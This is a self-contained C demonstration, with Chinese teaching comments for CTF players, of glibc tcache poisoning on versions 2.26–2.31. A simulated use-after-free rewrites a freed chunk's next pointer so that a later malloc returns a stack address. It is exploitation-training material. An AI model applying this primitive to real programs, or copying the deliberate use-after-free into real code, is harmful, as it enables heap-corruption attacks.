/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_poisoning
 * 文件标注范围：2.26 ~ 2.31
 * 模拟漏洞：借助 UAF 或重叠写，覆盖已释放 tcache chunk 的 next 字段。
 * 核心流程：把 next 改写为目标地址；2.32 起必须按 PROTECT_PTR(pos, ptr) 编码，并保证
 *   目标地址 0x10 对齐。
 * 成功判据：第二次 malloc 返回 target。这个原语只解决“任意地址分配”，最终要劫持到哪个
 *   点位，仍需根据具体题目另行选择。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// 关闭标准流缓冲，避免 stdio 内部的隐式堆分配打乱本例依赖的 chunk 顺序。
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	size_t stack_var;

	// 两个同尺寸的 chunk 依次释放后，会按 LIFO 顺序在链表里形成 b→a。
	intptr_t *a = malloc(128);
	intptr_t *b = malloc(128);

	free(a);
	free(b);

	/* 漏洞模拟：借助 UAF 或重叠写，覆盖已释放的 b 的 next 字段。
	 * 2.26～2.31 尚未启用 safe-linking，所以这里可以直接写入目标的明文地址。
	 */
	b[0] = (intptr_t)&stack_var;

	// 第一次分配正常取出表头 b；从这之后，被篡改进去的目标地址就成了新的 tcache 表头。
	intptr_t *first = malloc(128);
	assert(first == b);

	intptr_t *c = malloc(128);

	// 第二次分配应该返回栈上的目标地址，而不是原链表里的 a。
	assert((long)&stack_var == (long)c);
	return 0;
}
